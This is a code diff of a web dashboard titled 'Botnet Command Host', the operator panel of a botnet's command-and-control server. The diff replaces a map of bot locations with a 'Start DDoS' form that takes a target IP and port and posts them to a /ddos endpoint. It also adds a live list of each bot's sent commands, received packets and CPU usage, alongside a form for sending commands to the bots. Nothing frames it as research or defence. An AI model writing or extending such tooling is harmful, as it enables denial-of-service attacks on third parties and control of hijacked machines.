@@ -13,17 +13,27 @@
     <!-- Sidebar -->
     <div class="flex">
         <div class="w-1/5 bg-white shadow-md">
-            <div class="p-4">
-                <h1 class="text-2xl font-bold">Botnet Command Host</h1>
-                <ul class="mt-6">
-                    <li class="my-2">
-                        <a href="#" class="text-blue-500 hover:text-blue-700" id="overviewLink">Overview</a>
-                    </li>
-                    <li class="my-2">
-                        <a href="#" class="text-blue-500 hover:text-blue-700" id="botsLocationLink">Bots Location</a>
-                    </li>
-                </ul>
+            <div class="p-4 flex items-center">
+                <h1 class="text-3xl font-bold text-blue-900">Botnet Command Host</h1>
             </div>
+            <ul class="mt-8">
+                <li class="my-4">
+                    <a href="#" id="overviewLink" class="flex items-center text-lg text-gray-700 hover:text-blue-500">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 mr-2">
+                            <path d="M3 4h18M3 8h18M3 12h18"></path>
+                        </svg>
+                        Overview
+                    </a>
+                </li>
+                <li class="my-4">
+                    <a href="#" id="ddosLink" class="flex items-center text-lg text-gray-700 hover:text-blue-500">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 mr-2">
+                            <path d="M3 4h18M3 8h18M3 12h18"></path>
+                        </svg>
+                        DDoS
+                    </a>
+                </li>
+            </ul>
         </div>
 
         <!-- Main Content -->
@@ -36,14 +46,31 @@
                         <h3 class="text-xl font-semibold">Connected Bots</h3>
                         <p id="connectedBotsCount" class="text-gray-600"></p>
                     </div>
-                    <!-- Add more overview information here -->
+                    <div>
+                        <h3 class="text-xl font-semibold">Bot Activity</h3>
+                        <ul id="botActivityList" class="mt-2">
+                        </ul>
+                    </div>
                 </div>
             </div>
 
-            <!-- Bots Location -->
-            <div id="botsLocation" class="hidden">
-                <h2 class="text-2xl font-bold mb-4">Bots Location</h2>
-                <div id="map"></div>
+            <!-- DDoS -->
+            <div id="ddos" class="hidden">
+                <h2 class="text-2xl font-bold mb-4">DDoS</h2>
+                <div class="bg-white rounded-lg p-6 shadow-md">
+                    <form id="ddosForm">
+                        <div class="mb-4">
+                            <label for="targetIP" class="block font-semibold mb-1">Target IP:</label>
+                            <input type="text" id="targetIP" class="border border-gray-300 rounded-md px-2 py-1 w-full">
+                        </div>
+                        <div class="mb-4">
+                            <label for="targetPort" class="block font-semibold mb-1">Target Port:</label>
+                            <input type="text" id="targetPort" class="border border-gray-300 rounded-md px-2 py-1 w-full">
+                        </div>
+                        <!-- Add more DDoS options here -->
+                        <button type="submit" class="bg-blue-500 text-white rounded-md px-4 py-1">Start DDoS</button>
+                    </form>
+                </div>
             </div>
 
             <!-- Command Form -->
@@ -72,11 +99,9 @@
         </div>
     </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script>
         var botLocations = []; // Store bot locations
-        var map;
 
         // Update the connected bots count
         function updateConnectedBotsCount() {
@@ -98,6 +123,29 @@
         function updateCommandOutput(response) {
             var commandOutput = $('#commandOutput');
             commandOutput.text(response);
+        }
+
+        // Update the bot activity list
+        function updateBotActivityList(botActivity) {
+            var botActivityList = $('#botActivityList');
+            botActivityList.empty();
+            for (var i = 0; i < botActivity.length; i++) {
+                var activity = botActivity[i];
+                var listItem = $('<li></li>').text(activity.bot_address);
+                listItem.on('click', { activity: activity }, showBotActivityDetails);
+                botActivityList.append(listItem);
+            }
+        }
+
+        // Show the details of a specific bot activity
+        function showBotActivityDetails(event) {
+            var activity = event.data.activity;
+            var botDetails = $('#botDetails');
+            botDetails.empty();
+            botDetails.append($('<p></p>').text('Bot Address: ' + activity.bot_address));
+            botDetails.append($('<p></p>').text('Sent Commands: ' + activity.sent_commands));
+            botDetails.append($('<p></p>').text('Received Data Packets: ' + activity.received_packets));
+            botDetails.append($('<p></p>').text('CPU Usage: ' + activity.cpu_usage));
         }
 
         // Submit the command form via AJAX
@@ -133,6 +181,32 @@
             $('#commandInput').val('');
         });
 
+        // Submit the DDoS form via AJAX
+        $('#ddosForm').on('submit', function(event) {
+            event.preventDefault();
+
+            var targetIP = $('#targetIP').val();
+            var targetPort = $('#targetPort').val();
+
+            $.ajax({
+                url: '/ddos',
+                method: 'POST',
+                data: {
+                    target_ip: targetIP,
+                    target_port: targetPort
+                },
+                success: function(data) {
+                    // Handle DDoS success response if needed
+                },
+                error: function(error) {
+                    console.log(error);
+                }
+            });
+
+            $('#targetIP').val('');
+            $('#targetPort').val('');
+        });
+
         // Fetch and update the bots location from the server
         function fetchBotsLocation() {
             fetch('/bots_location')
@@ -147,37 +221,36 @@
             });
         }
 
+        // Fetch and update the bot activity from the server
+        function fetchBotActivity() {
+            fetch('/bot_activity')
+            .then(response => response.json())
+            .then(data => {
+                updateBotActivityList(data);
+            })
+            .catch(error => {
+                console.log(error);
+            });
+        }
+
         // Toggle visibility of dashboard sections
         $('#overviewLink').on('click', function(event) {
             event.preventDefault();
             $('#overview').removeClass('hidden');
-            $('#botsLocation').addClass('hidden');
+            $('#ddos').addClass('hidden');
         });
 
-        $('#botsLocationLink').on('click', function(event) {
+        $('#ddosLink').on('click', function(event) {
             event.preventDefault();
             $('#overview').addClass('hidden');
-            $('#botsLocation').removeClass('hidden');
-
-            if (!map) {
-                // Create the map when switching to the bot locations section
-                map = L.map('map').setView([0, 0], 2);
-
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                    attribution: 'Map data &copy; <a href="https://www.openstreetmap.org/">OpenStreetMap</a> contributors',
-                    maxZoom: 18,
-                }).addTo(map);
-            }
-
-            for (var i = 0; i < botLocations.length; i++) {
-                var location = botLocations[i];
-                L.marker([location.lat, location.lng]).addTo(map)
-                    .bindPopup('<b>Bot:</b> ' + location.bot_address + '<br><b>Location:</b> ' + location.location);
-            }
+            $('#ddos').removeClass('hidden');
         });
 
         // Fetch and update the bots location initially
         fetchBotsLocation();
+
+        // Fetch and update the bot activity every 5 seconds
+        setInterval(fetchBotActivity, 5000);
     </script>
 </body>
 </html>
